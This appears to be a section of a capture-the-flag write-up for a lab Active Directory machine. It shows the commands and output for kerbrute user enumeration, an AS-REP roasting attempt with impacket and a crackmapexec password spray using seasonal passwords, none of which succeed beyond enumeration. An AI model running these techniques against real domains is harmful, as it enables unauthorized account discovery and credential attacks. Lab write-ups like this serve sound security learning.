## ASREP Roasting & Password Spraying

Leverage Kerberos pre-authentication indicates that all of the users are valid domain users.

```bash
$ kerbrute userenum -d fabricorp.local --dc 10.129.2.5 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/06/21 - Ronnie Flathers @ropnop

2021/12/06 18:33:28 >  Using KDC(s):
2021/12/06 18:33:28 >   10.129.2.5:88

2021/12/06 18:33:28 >  [+] VALID USERNAME:       tlavel@fabricorp.local
2021/12/06 18:33:28 >  [+] VALID USERNAME:       sthompson@fabricorp.local
2021/12/06 18:33:28 >  [+] VALID USERNAME:       bnielson@fabricorp.local
2021/12/06 18:33:28 >  [+] VALID USERNAME:       bhult@fabricorp.local
2021/12/06 18:33:33 >  [+] VALID USERNAME:       pmerton@fabricorp.local
2021/12/06 18:33:33 >  Done! Tested 5 usernames (5 valid) in 5.105 seconds
```

`FUSE$` is the only valid computer account.

```bash
$ kerbrute userenum -d fabricorp.local --dc 10.129.2.5 computers.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/06/21 - Ronnie Flathers @ropnop

2021/12/06 18:34:24 >  Using KDC(s):
2021/12/06 18:34:24 >   10.129.2.5:88

2021/12/06 18:34:24 >  [+] VALID USERNAME:       FUSE$@fabricorp.local
2021/12/06 18:34:24 >  Done! Tested 5 usernames (1 valid) in 0.062 seconds
```

None of the users are ASREP Roastable.

```bash
$ impacket-GetNPUsers -dc-ip 10.129.2.5 fabricorp.local/ -usersfile users.txt -format hashcat
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User pmerton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bnielson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tlavel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sthompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bhult doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Password spraying the users was also unsuccessful.

```bash
$ crackmapexec smb 10.129.2.5 -d fabricorp.local -u users.txt -p passwords.txt
SMB         10.129.2.5      445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Summer2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Summer2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Spring2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Spring2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Winter2019 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Winter2019! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Summer2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Summer2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Spring2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Spring2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Winter2019 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Winter2019! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Summer2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Summer2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Spring2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Spring2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Winter2019 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Winter2019! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Summer2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Summer2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Spring2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Spring2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Winter2019 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Winter2019! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Summer2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Summer2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Spring2020 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Spring2020! STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Winter2019 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Winter2019! STATUS_LOGON_FAILURE
```
